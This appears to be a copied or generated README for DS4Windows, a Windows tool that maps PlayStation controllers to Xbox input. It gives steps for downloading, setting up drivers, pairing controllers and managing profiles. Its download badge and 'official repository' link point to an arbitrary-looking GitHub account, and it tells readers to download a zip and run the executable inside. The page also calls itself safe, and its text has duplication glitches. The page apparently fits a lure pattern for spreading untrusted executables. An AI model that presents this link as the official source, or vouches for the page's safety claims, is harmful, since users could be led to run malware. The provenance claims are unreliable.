# 🎮 DS4Windows - Use PlayStation Controllers On Windows

[![](https://img.shields.io/badge/Download-DS4Windows-blue.svg)](https://github.com/ursaaustenitic585/DS4Windows)

DS4Windows lets you use Sony PlayStation controllers on your Windows 10 or Windows 11 computer. The software makes your computer think you connected an official Xbox controller. This change allows you to play almost any game that supports standard controllers.

## 🛠️ System Requirements

You need a few things before you start:

- A PC running Windows 10 or Windows 11.
- A Sony DualShock 4 or DualSense PS5 controller.
- A USB cable or a Bluetooth adapter for a wireless connection.
- Microsoft .NET 6.0 Runtime (the software will prompt you to install this if you do not have it).

## 📥 How To Download And Install

1. Visit the [official repository page](https://github.com/ursaaustenitic585/DS4Windows) to reach the software.
2. Look for the Releases section on the right side of the page.
3. Click on the latest release version.
4. Download the file named "DS4Windows.zip" to your computer.
5. Create a new folder on your desktop and move the zip file inside it.
6. Right-click the folder and choose "Extract All" to unpack the contents.
7. Open the folder and double-click "DS4Windows.exe" to start the program.

## ⚙️ Initial Setup Guide

When you run the application for the first time, a setup window appears. Follow these steps to configure your device:

1. Choose where to save your settings. The program will ask to save to "Program Folder" or "Appdata". You should select "Program Folder" if you want a portable installation.
2. A prompt explains that you need to install the ViGEmBus driver. This driver translates your controller inputs. Click "Step 1: Step 1: Install ViGEmBus Driver" and follow the installation instructions.
3. If you plan to use Bluetooth, click "Step 2: Install Bluetooth Driver" if prompted, though most Windows 10 and 11 systems handle Bluetooth connections without extra steps.
4. Close the installer window once the drivers finish installing.
5. Restart the application if it asks for a restart to finish the setup.

## 🕹️ Connecting Your Controller

You can connect your controller in two ways.

### Wired Connection
Plug the USB cable into your controller and then into your computer. Windows will identify the device. DS4Windows will detect the input automatically and show the controller in the "Controllers" tab.

### Wireless Connection
1. Open the Bluetooth settings on your PC.
2. Put your controller in pairing mode. For PS4 controllers, hold the Share and PlayStation buttons until the light bar flashes. For PS5 controllers, hold the Create and PlayStation buttons until the light bar flashes.
3. Select the controller in your Windows Bluetooth menu.
4. DS4Windows will recognize the active connection after a moment.

## 💡 Using The Main Interface

The application interface allows you to manage multiple controllers.

- **Controllers Tab:** This shows all connected devices. You see the color of the light bar, the battery level, and the current profile.
- **Profiles Tab:** You can change how your buttons work here. You can set up macros, change stick sensitivity, or adjust dead zones for your thumbsticks.
- **Settings Tab:** This area contains global configurations. You can set the program to start when you log into Windows or hide the actual PlayStation controller so the game only sees the emulated Xbox controller.

## 🔧 Managing Profiles

Profiles allow you to switch button layouts for different games.

1. Click the "Profiles" tab.
2. Select "New" to create a custom layout.
3. Click on any button on the visual controller to remap it to a different input.
4. Adjust the "Output Controller" setting to dictate how the game identifies your device. Xbox 360 is the safest option for maximum compatibility.

## 🚀 Improving Performance

If you experience input lag or connection drops, try these adjustments:

- Set your controller polling rate to 1000Hz or 500Hz in the device settings. This tells the controller to send data to the PC more often.
- If you use Bluetooth, keep the controller close to the Bluetooth receiver to avoid interference from other electronic devices.
- Disable "Hide DS4 Controller" in the settings if you have issues with games detecting two controllers at once, or enable it if you experience "double input" behavior in your games.

## ❓ Troubleshooting Common Issues

**The controller does not show up.**
Make sure your USB cable is not purely for charging. Some cables do not pass data. Try a different USB port or a different cable.

**My game detects two controllers.**
This happens when a game recognizes both your physical controller and the emulated Xbox controller. Check the "Hide DS4 Controller" box in the settings tab to prevent this.

**The buttons are mapped incorrectly.**
Go to the "Profiles" tab and verify your current layout. Reset the profile to the default settings to fix accidental changes.

**The program requires .NET.**
The software cannot run without the .NET runtime. If the program fails to open, navigate to the official Microsoft website and download the .NET Desktop Runtime.

## 🛡️ Privacy And Safety

This software runs locally on your machine. It does not send your input data or personal information to external servers. Your settings save directly to your own hard drive folder. Ensure you only download the software from the official link provided here to avoid malicious copies. 

The software includes a "Log" tab at the bottom. Check this if the controller disconnects or if the application acts in an unexpected way. The log provides specific error messages that help solve connection problems quickly. 

Check for regular updates in the "Settings" tab. The developer adds support for new hardware and fixes minor software bugs through the update tool. You can check for updates manually with one click to remain on the latest version.